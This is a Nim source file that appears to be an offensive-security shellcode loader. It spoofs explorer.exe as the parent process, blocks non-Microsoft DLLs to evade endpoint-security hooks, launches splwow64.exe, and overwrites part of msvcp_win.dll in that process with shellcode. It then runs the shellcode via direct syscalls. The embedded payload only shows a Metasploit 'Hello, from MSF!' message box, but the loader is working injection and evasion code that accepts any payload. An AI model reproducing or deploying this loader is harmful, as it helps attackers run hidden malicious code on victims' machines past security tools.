import winim
include syscalls
import strformat
import strutils
import os

const
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x00000003 shl 44 #Gr33tz to @_RastaMouse ;)
    PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON = 0x00000001 shl 36

proc toString(chars: openArray[WCHAR]): string =
  result = ""
  for c in chars:
    if cast[char](c) == '\0':
      break
    result.add(cast[char](c))

proc GetProcessByName(process_name: string): DWORD =
  var
    pid: DWORD = 0
    entry: PROCESSENTRY32
    hSnapshot: HANDLE

  entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  defer: CloseHandle(hSnapshot)

  if Process32First(hSnapshot, addr entry):
    while Process32Next(hSnapshot, addr entry):
        if entry.szExeFile.toString == process_name:
            pid = entry.th32ProcessID
            break

  return pid



proc splwow_crt(shellcode: openarray[byte]): void =

  var
    si: STARTUPINFOEX
    pi: PROCESS_INFORMATION
    ps: SECURITY_ATTRIBUTES
    ts: SECURITY_ATTRIBUTES
    policy: DWORD64
    lpSize: SIZE_T
    res: WINBOOL
    sc_size: SIZE_T = cast[SIZE_T](shellcode.len)

  echo fmt"shellcode_length {sc_size}"

  si.StartupInfo.cb = sizeof(si).cint
  ps.nLength = sizeof(ps).cint
  ts.nLength = sizeof(ts).cint

  InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)

  si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))

  InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)

  policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE or PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON

  res = UpdateProcThreadAttribute(
    si.lpAttributeList,
    0,
    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
    addr policy,
    sizeof(policy),
    NULL,
    NULL
  )

  var processId = GetProcessByName("explorer.exe")
  echo fmt"[*] Found PPID: {processId}"

  var parentHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId)

  res = UpdateProcThreadAttribute(
    si.lpAttributeList,
    0,
    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
    addr parentHandle,
    sizeof(parentHandle),
    NULL,
    NULL
  )

  res = CreateProcess(
    NULL,
    newWideCString(r"C:\Windows\splwow64.exe"),
    ps,
    ts, 
    FALSE,
    EXTENDED_STARTUPINFO_PRESENT,
    NULL,
    NULL,
    addr si.StartupInfo,
    addr pi
  )

    
  echo fmt"[+] Started process with PID: {pi.dwProcessId}"

  sleep(2000)

  var pHandle = pi.hProcess
  var tHandle = pi.hThread

  echo "suspending the main thread..."
  discard NtSuspendThread(tHandle, NULL)

  var modulebuf: array[255, HMODULE]
  var cb : DWORD = 255*sizeof(HMODULE)
  var req: DWORD
  var mod_name: array[MAX_PATH, WCHAR]
  var testmodinfo: MODULEINFO

  var base_addr : LPVOID

  echo("[+] enumerating modules")
  EnumProcessModules(pHandle, &modulebuf[0], cb, &req)
  var mod_count: int = req div sizeof(HMODULE)
  echo("[+] iterating over modules")
  echo fmt"[?] total {mod_count} modules found"
  for i in 1..mod_count:
    if GetModuleFileNameEx(pHandle, modulebuf[i], &mod_name[0], cast[DWORD](sizeof(mod_name))):
      if  "msvcp_win.dll" in toString(mod_name):
        echo("[*] found module")
        if GetModuleInformation(pHandle, modulebuf[i], &testmodinfo, cast[DWORD](sizeof(MODULEINFO))):
          base_addr = cast[LPVOID](cast[int64](testmodinfo.lpBaseOfDll) + 4096)
          echo fmt"  module entrypoint {toHex(cast[int64](base_addr))}"

  var oldprotect: ULONG 
  var bytesWritten: SIZE_T
  
  var status = NtProtectVirtualMemory(
    pHandle,
    addr base_addr,
    &sc_size,
    PAGE_READWRITE,
    &oldprotect
  ) 
  echo "[*] ProtectVirtualMemory: ", RtlNtStatusToDosError(status)
  echo "[*] writing from: ", toHex(cast[int64](unsafeAddr shellcode))
  echo "[*] writing to: ", toHex(cast[int64](base_addr))

  status = NtWriteVirtualMemory(
    pHandle, 
    base_addr, 
    unsafeAddr shellcode[0], 
    sc_size, 
    &bytesWritten);
  echo "[*] WriteProcessMemory: ", RtlNtStatusToDosError(status)
  echo "    \\-- bytes written: ", bytesWritten
  echo ""
  status = NtProtectVirtualMemory(
    pHandle,
    addr base_addr,
    &sc_size,
    PAGE_EXECUTE_READ,
    &oldprotect
  ) 
  echo "[*] ProtectVirtualMemory: ", RtlNtStatusToDosError(status)
  
  var inj_handle: HANDLE

  status = NtCreateThreadEx(
    &inj_handle,
    0x1FFFFF, 
    NULL,
    pHandle, 
    cast[LPTHREAD_START_ROUTINE](base_addr), 
    NULL,
    FALSE,
    0,
    0, 
    0, 
    NULL);
  echo "[*] NtCreateThreadEx: ", RtlNtStatusToDosError(status)

  status = NtResumeThread(tHandle, NULL);
  echo "[*] NtResumeThread: ", RtlNtStatusToDosError(status)

  status = NtClose(tHandle)
  status = NtClose(pHandle)

  echo "[+] Injected"





when isMainModule:
  var shellcode: array[295, byte] = [
        byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
        0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
        0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
        0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
        0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
        0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
        0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
        0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
        0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
        0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
        0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
        0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
        0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
        0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
        0x85,0x0f,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x65,0x6c,
        0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,
        0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]
  splwow_crt(shellcode)
